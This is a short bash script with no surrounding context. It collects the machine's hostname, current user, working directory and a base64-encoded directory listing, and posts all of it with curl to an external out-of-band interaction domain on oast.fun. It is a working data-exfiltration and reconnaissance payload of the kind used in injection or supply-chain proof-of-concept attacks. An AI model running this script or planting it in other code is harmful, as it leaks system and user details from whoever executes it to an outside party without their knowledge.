#!/bin/bash

curl -H "Hostname: $(hostname)" -H "Whoami: $(whoami)" -H "Pwd: $(pwd)" -d $(ls -la | base64)  http://esc.cdd5h042vtc000000jh0ggsujfcyyyyyn.oast.fun
